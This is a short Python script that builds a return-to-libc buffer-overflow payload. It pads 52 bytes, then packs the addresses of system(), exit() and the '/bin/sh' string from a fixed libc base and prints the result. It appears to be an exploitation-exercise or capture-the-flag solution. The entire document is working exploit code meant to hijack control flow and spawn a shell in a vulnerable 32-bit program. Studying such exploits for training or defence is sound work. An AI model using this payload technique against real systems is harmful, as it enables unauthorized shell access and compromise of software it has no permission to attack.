import struct

buf = "A"*52

libc = 0xb7e19000
system = struct.pack('<I', libc + 0x0003ada0)
exit = struct.pack('<I', libc + 0x0002e9d0)
binsh = struct.pack('<I', libc + 0x0015ba0b)

payload = buf + system + exit + binsh

print(payload)
